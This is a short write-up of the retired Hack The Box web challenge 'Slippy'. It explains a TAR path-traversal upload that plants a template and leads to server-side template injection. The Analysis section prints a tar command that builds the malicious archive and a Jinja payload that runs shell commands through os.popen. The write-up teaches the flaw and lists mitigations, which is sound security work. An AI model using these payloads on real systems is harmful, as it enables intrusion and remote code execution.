---
challenge: Slippy
type: Web
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [web, tar, path-traversal, ssti, file-upload]
---

# Slippy — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

The app extracts uploaded TAR files without validating paths. A `../` writes a template outside the intended directory and the resulting SSTI executes commands.

## Prompt and surface

- Web, Medium, retired.
- `.tar` upload.
- Template rendering.

```bash
curl -i http://<HOST>/
```

## Reconnaissance

Review the code and confirm extraction with `tarfile`/`tar`. Inspect internal paths and the template directory.

## Analysis

1. Create a TAR with an entry `../../templates/evil.html`.
2. Upload and extract it.
3. Visit the template to confirm SSTI.
4. Execute a command.
5. Read the flag.

```bash
tar -cvf evil.tar --transform 's|^|../../templates/|' evil.html
```

```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

## Root cause

Extraction does not normalize paths or restrict the destination. The file escapes the directory and is interpreted as a template, leading to RCE.

## Local reproduction

1. Run the upload/extract app.
2. Create the malicious TAR.
3. Upload and visit.
4. Run `id`.
5. Validate paths and compare.

## Evidence

- TAR listing.
- Written path.
- SSTI and redacted flag.

## Lessons learned

- TARs can contain `../`.
- Extraction must validate paths.
- Editable templates are RCE.
- An upload sandbox is essential.

## Mitigation and detection

- Normalize and validate extraction paths.
- Extract into an isolated, non-executable directory.
- Do not allow user templates.
- Monitor writes outside the upload dir.

## References

- <https://www.hackthebox.com/challenges/slippy>
- <https://owasp.org/www-community/attacks/Path_Traversal>
- <https://docs.python.org/3/library/tarfile.html#tarfile-extractall>
